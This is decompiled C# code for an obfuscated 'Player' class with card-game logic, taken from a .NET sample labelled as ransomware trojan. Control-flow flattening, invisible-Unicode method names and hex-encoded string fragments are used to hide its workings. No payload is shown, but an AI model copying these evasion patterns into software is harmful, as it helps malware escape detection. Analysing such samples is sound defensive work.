// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: PEFileEvidenceFacto, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 33D8CF26-6BC9-4426-B954-9C7650E72B0A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-09acaed1582d4f3da067862bc15fb60d54d8e65c2a64bd2432d354941daf716f.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
label_1:
      int num1 = 1718280443;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1202518937)) % 9U)
        {
          case 0:
            num1 = (int) num2 * 47309315 ^ 835897654;
            continue;
          case 1:
            num1 = (int) num2 * -1524878739 ^ -840726568;
            continue;
          case 2:
            str1 = "633273346A";
            num1 = (int) num2 * -881322387 ^ 829652298;
            continue;
          case 3:
            goto label_1;
          case 4:
            str1 = "43616C6C436F6E7465";
            num1 = (int) num2 * 1088922142 ^ 2084788935;
            continue;
          case 5:
            int num3 = BaseStream == 0 ? -995394524 : (num3 = -1210858901);
            num1 = num3 ^ (int) num2 * -1548960179;
            continue;
          case 6:
            str2 = str1;
            num1 = 418033593;
            continue;
          case 7:
            int num4;
            num1 = num4 = BaseStream == 1 ? 265203676 : (num4 = 920363794);
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -1863240457;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -17770162)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * 1212506617 ^ 1531752128;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 3:
            num4 = 0;
            break;
          default:
            goto label_8;
        }
        num2 = num4;
        num1 = -835785328;
      }
label_8:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = -1392764674;
        int[] planningCards;
        int index;
        int planningCardsCount;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num2 ^ -1482594608)) % 12U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4;
              num2 = num4 = planningCards[index] <= 0 ? -804052264 : (num4 = -141311025);
              continue;
            case 2:
              num2 = (int) num3 * 1062863733 ^ -1053389881;
              continue;
            case 3:
              int num5;
              num2 = num5 = index < planningCards.Length ? -29848047 : (num5 = -1049519444);
              continue;
            case 4:
              ++index;
              num2 = -1392070205;
              continue;
            case 5:
              num2 = (int) num3 * -323139644 ^ 586956711;
              continue;
            case 6:
              num2 = (int) num3 * -528755389 ^ 729502832;
              continue;
            case 7:
              index = 0;
              num2 = (int) num3 * 719402114 ^ -1414256073;
              continue;
            case 8:
              planningCardsCount = num1;
              num2 = (int) num3 * 1682332026 ^ -578701794;
              continue;
            case 10:
              planningCards = this.PlanningCards;
              num2 = (int) num3 * -219294579 ^ -505820715;
              continue;
            case 11:
              ++num1;
              num2 = (int) num3 * 909664197 ^ -82529533;
              continue;
            default:
              goto label_13;
          }
        }
label_13:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 420930903;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 557231089)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -2104473328 ^ 1685077030;
            continue;
          case 2:
            num1 = (int) num2 * 1016563238 ^ -1561406540;
            continue;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -818150509;
      int planningCard;
      bool flag;
      string str1;
      int index;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1015136042)) % 13U)
        {
          case 0:
            goto label_1;
          case 1:
            planningCard = this.PlanningCards[index];
            num1 = -1202527983;
            continue;
          case 2:
            num1 = (int) num2 * 749799978 ^ -1990361782;
            continue;
          case 3:
            num1 = (int) num2 * -58542071 ^ 1103468095;
            continue;
          case 5:
            flag = planningCard == 0;
            num1 = (int) num2 * 714719564 ^ 1216733053;
            continue;
          case 6:
            index = 0;
            num1 = (int) num2 * 1993002839 ^ -1344305488;
            continue;
          case 7:
            int num3 = !flag ? -648562090 : (num3 = -1540622088);
            num1 = num3 ^ (int) num2 * 2088429804;
            continue;
          case 8:
            ++index;
            num1 = -1575216192;
            continue;
          case 9:
            str1 = Player.\u206A‍‬‍‫​‪⁪​‌⁬⁯‌‎‎‫‬‌‌⁬‪‏‪‬‎‍⁫⁭‎‎​‪⁬‪‬‏​⁫⁯⁭‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -817280971;
            continue;
          case 10:
            int num4;
            num1 = num4 = index < this.PlanningCards.Length ? -1741444490 : (num4 = -1598300036);
            continue;
          case 11:
            str1 = " ";
            num1 = (int) num2 * -1157387682 ^ 721095617;
            continue;
          case 12:
            str2 = str1;
            num1 = (int) num2 * 1883638286 ^ -1084164187;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 1563870246;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1843662887)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1149511610 ^ -753827296;
            continue;
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 966674368 ^ 1042206123;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -1013739606;
      int aIndex;
      int[] numArray;
      int[] planningCards;
      int count;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -147944536)) % 9U)
        {
          case 0:
            planningCards = numArray;
            num1 = (int) num2 * -692191108 ^ 689883165;
            continue;
          case 1:
            num1 = (int) num2 * 489839265 ^ -851990488;
            continue;
          case 2:
            num1 = (int) num2 * -491777925 ^ -131646104;
            continue;
          case 3:
            ++aIndex;
            num1 = (int) num2 * -952723025 ^ -1422056496;
            continue;
          case 5:
            int num3;
            num1 = num3 = aIndex < count ? -1399147131 : (num3 = -1995740865);
            continue;
          case 6:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -821373609;
            continue;
          case 7:
            count = json.Count;
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * 390719430 ^ 367839183;
            continue;
          case 8:
            goto label_1;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -2013091831;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -383168084)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str = Player.\u200C‌‌‫⁪‍‮‍⁮‬⁭‌‏⁭‎‍​‏⁫‪⁪⁪‭‭⁯‫‍‭‬⁯‮‭⁯‍‬‪⁪‍​⁪‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -1073276155 ^ -969926346;
            continue;
          case 3:
            num1 = (int) num2 * 1333333477 ^ 745442257;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u206A‍‬‍‫​‪⁪​‌⁬⁯‌‎‎‫‬‌‌⁬‪‏‪‬‎‍⁫⁭‎‎​‪⁬‪‬‏​⁫⁯⁭‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200C‌‌‫⁪‍‮‍⁮‬⁭‌‏⁭‎‍​‏⁫‪⁪⁪‭‭⁯‫‍‭‬⁯‮‭⁯‍‬‪⁪‍​⁪‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
